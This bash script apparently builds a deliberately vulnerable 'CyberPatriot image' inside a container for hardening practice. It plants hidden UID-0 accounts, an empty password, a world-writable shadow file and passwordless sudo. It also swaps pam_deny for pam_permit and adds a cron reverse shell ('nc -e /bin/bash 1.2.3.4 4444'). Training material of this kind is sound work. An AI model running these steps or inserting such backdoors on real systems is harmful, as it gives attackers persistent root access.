#!/usr/bin/env bash
# Turns a clean container into a small vulnerable "CyberPatriot image". Container use only.
set -e
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq >/dev/null
apt-get install -y -qq sudo passwd login john nmap vsftpd cups openssh-server cron pamtester procps iproute2 iptables ufw file >/dev/null 2>&1

mk() { useradd -m -s /bin/bash "$1"; echo "$1:$2" | chpasswd; }
mk santa   'Santa#2026pass';  usermod -aG sudo santa     # authorized admin
mk prancer 'Pr@ncer2026x';    usermod -aG sudo prancer   # authorized USER wrongly in sudo
mk hacker  'Hack3r#2026xx'                               # not in README
useradd -m -s /bin/bash dasher; passwd -d dasher >/dev/null   # authorized user, EMPTY password
useradd -o -u 0 -g 0 -M -s /bin/bash toor                     # hidden root account
useradd -o -u 0 -g 0 -m -d /home/blitzen -s /bin/bash blitzen      # README user secretly UID 0
# cupid is in the README but missing on the box
echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf                    # loads AFTER sysctl.d
printf '\nMatch User sftponly\n    ForceCommand internal-sftp\n' >> /etc/ssh/sshd_config

chmod 666 /etc/shadow
sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
mkdir -p /run/sshd
echo "net.ipv4.tcp_syncookies=0" > /etc/sysctl.d/10-bad.conf
echo '* * * * * root nc -e /bin/bash 1.2.3.4 4444' > /etc/cron.d/backdoor
mkdir -p /home/santa/Music && echo "not really music" > /home/santa/Music/song.mp3

# Broken apt sources (last, after our own installs): commented deb lines + deb822 "Enabled: no".
for f in /etc/apt/sources.list /etc/apt/sources.list.d/*.list; do
    [ -f "$f" ] && sed -i -E 's/^(deb[[:space:]])/# \1/' "$f"
done
for f in /etc/apt/sources.list.d/*.sources; do
    [ -f "$f" ] && { grep -q '^Enabled:' "$f" && sed -i 's/^Enabled:.*/Enabled: no/' "$f" || sed -i '/^Types:/a Enabled: no' "$f"; }
done

# weak password history (remember=0 used to count as ok)
sed -i -E "/^[^#]*pam_unix.so/s/$/ remember=0/" /etc/pam.d/common-password

# From the ETH007 Arena image (Debian 11): a live Kali repo, a world-writable service config,
# and passwords last changed long before the round (max 90 would expire them at once).
echo 'deb http://http.kali.org/kali kali-rolling main non-free contrib' > /etc/apt/sources.list.d/kali.list
chmod 777 /etc/vsftpd.conf
chage -d 2024-01-03 santa
chage -d 2024-01-03 prancer   # RESET_PASSWORDS skips passwords changed today; images are built months ahead
# Edited security tool + reverse-shell cron (ETH007: ufw edited, "* * * * * root pearl" in /etc/crontab).
# (chattr +i needs CAP_LINUX_IMMUTABLE, which containers lack: the lock part is unit-tested only.)
echo '# tampered by the image maker' >> /usr/sbin/ufw
printf '#!/bin/sh\nexec perl -e "reverse shell"\n' > /usr/local/bin/pearl; chmod +x /usr/local/bin/pearl
echo '* * * * * root pearl' >> /etc/crontab
printf '#!/bin/sh\necho odd\n' > /usr/local/bin/oddtool; chmod +x /usr/local/bin/oddtool   # unowned, harmless
# Second ETH007 pass: sudo without a password, a system account with a shell, world-writable /var/mail.
mkdir -p /etc/sudoers.d; printf 'Defaults !authenticate\n' > /etc/sudoers.d/README; chmod 440 /etc/sudoers.d/README
usermod -s /bin/sh sys
mkdir -p /var/mail; chmod 777 /var/mail
# pam_deny.so replaced by pam_permit.so (ETH007): a wrong password gets in.
secdir="$(dirname "$(find / -xdev -name pam_permit.so -path '*security*' 2>/dev/null | head -1)")"
cp "$secdir/pam_permit.so" "$secdir/pam_deny.so"

cat > /tmp/cp-config.txt <<'EOF'
ADMINS=santa
USERS=prancer dasher cupid blitzen
CRITICAL_SERVICES=vsftpd ssh
ALLOWED_SOFTWARE=nmap
NEW_PASSWORD=Cyb3rP@triot!2026
RESET_PASSWORDS=yes
EOF
echo "planted"
